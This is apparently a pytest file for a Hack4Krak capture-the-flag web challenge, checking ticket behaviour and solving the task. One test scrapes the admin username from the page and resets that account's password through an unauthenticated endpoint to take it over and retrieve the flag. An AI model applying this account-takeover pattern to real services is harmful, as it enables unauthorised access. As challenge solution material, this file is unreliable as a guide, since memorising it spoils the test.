import re
import time
import uuid
from pathlib import Path

from toolbox.utils.test_utils import RequestHelper, check_status_code, load_flag_hash, validate_flag_hash

task_path = Path(__file__).parent.parent
default_host = "unemployment-is-over-party.hack4krak.pl"


def test_ticket_closed_after_reply():
    request = RequestHelper(default_host=default_host)
    username = f"user_{uuid.uuid4().hex[:8]}"
    password = "password123"

    res = request.post("/api/auth/register", json={"username": username, "password": password})
    check_status_code(res, 200)

    res = request.post("/api/auth/login", json={"username": username, "password": password})
    check_status_code(res, 200)
    cookies = {"session_token": res.cookies.get("session_token")}

    res = request.post("/api/ticket/submit", cookies=cookies)
    check_status_code(res, 200)

    try:
        res = request.post("/api/ticket/reply", json={"content": "Here is my reply"}, cookies=cookies)
        check_status_code(res, 200)

        res = request.get("/api/ticket/current", cookies=cookies)
        check_status_code(res, 200)
        data = res.json()
        assert data["ticket"]["is_closed"] in (1, True)
        messages = data["messages"]
        assert any("Odrzucam podanie" in msg["content"] for msg in messages)
    finally:
        request.post("/api/ticket/clear", cookies=cookies)


def test_admin_password_change_and_get_flag():
    request = RequestHelper(default_host=default_host)
    username = f"user_{uuid.uuid4().hex[:8]}"
    password = "password123"

    res = request.post("/api/auth/register", json={"username": username, "password": password})
    check_status_code(res, 200)

    res = request.post("/api/auth/login", json={"username": username, "password": password})
    check_status_code(res, 200)
    user_cookies = {"session_token": res.cookies.get("session_token")}

    res = request.post("/api/ticket/submit", cookies=user_cookies)
    check_status_code(res, 200)

    try:
        res = request.get("/api/ticket/current", cookies=user_cookies)
        check_status_code(res, 200)
        ticket_id = res.json()["ticket"]["id"]

        time.sleep(2)

        res = request.get("/", cookies=user_cookies)
        check_status_code(res, 200)
        html = res.text

        match = re.search(r"Administracja_[a-fA-F0-9\-]{5,}", html)
        assert match is not None, "Admin username not found in HTML"
        admin_username = match.group(0)

        new_admin_password = "pwned_password"
        res = request.post(
            "/api/auth/change-password",
            json={"username": admin_username, "new_password": new_admin_password},
        )
        check_status_code(res, 200)

        res = request.post("/api/auth/login", json={"username": admin_username, "password": new_admin_password})
        check_status_code(res, 200)
        admin_cookies = {"session_token": res.cookies.get("session_token")}

        res = request.post("/api/ticket/accept", json={"ticket_id": ticket_id}, cookies=admin_cookies)
        check_status_code(res, 200)

        res = request.get("/api/ticket/current", cookies=user_cookies)
        check_status_code(res, 200)
        messages = res.json()["messages"]

        flag_message = next((msg["content"] for msg in reversed(messages) if "Hack4KrakCTF{" in msg["content"]), None)
        assert flag_message is not None, "Flag not found in messages"

        flag_content = flag_message.split("Hack4KrakCTF{")[1].split("}")[0]

        flag_hash = load_flag_hash(task_path)
        assert flag_hash is not None
        assert validate_flag_hash(flag_content, flag_hash)
    finally:
        request.post("/api/ticket/clear", cookies=user_cookies)
